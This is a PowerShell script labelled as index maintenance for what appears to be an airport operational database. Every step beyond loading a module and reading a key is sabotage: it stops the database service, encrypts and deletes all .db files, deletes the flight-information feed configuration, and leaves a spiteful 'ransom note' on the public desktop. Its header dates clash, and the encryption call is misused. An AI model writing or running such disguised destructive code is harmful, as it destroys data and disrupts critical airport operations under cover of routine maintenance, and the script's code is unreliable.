# AODB Index Maintenance Script
# Created: 10/22/2026
# Last Modified: 10/17/2026 (by svc_nexgen_aodb)
# Purpose: Index optimization

# Import required modules
Import-Module -Name 'C:\AODB\Modules\DBUtils.psm1'

# Check for encryption key
if (Test-Path 'C:\AODB\Keys\aes256_key.dat') {
 $Key = Get-Content 'C:\AODB\Keys\aes256_key.dat' -Raw
} else {
 Write-Error 'Encryption key not found. Aborting.'
 exit 1
}

# Stop AODB service
Stop-Service -Name 'AODB_Service' -Force

# Encrypt database files
$Files = Get-ChildItem 'C:\AODB\Data\' -Filter *.db
foreach ($File in $Files) {
 $EncryptedPath = $File.FullName + '.enc'
 $Data = Get-Content $File.FullName -Raw
 $EncryptedData = ConvertTo-SecureString $Data -Key $Key -Encrypted
 Set-Content $EncryptedPath $EncryptedData
 Remove-Item $File.FullName
}

# Delete FIDS data feed configuration
Remove-Item 'C:\AODB\Config\FIDS_Config.xml' -Force

# Drop ransom note
$Note = 'You should have hired me. — D'
New-Item -Path 'C:\Users\Public\Desktop\README_NCIA.txt' -ItemType File -Value $Note

# Exit
exit 0
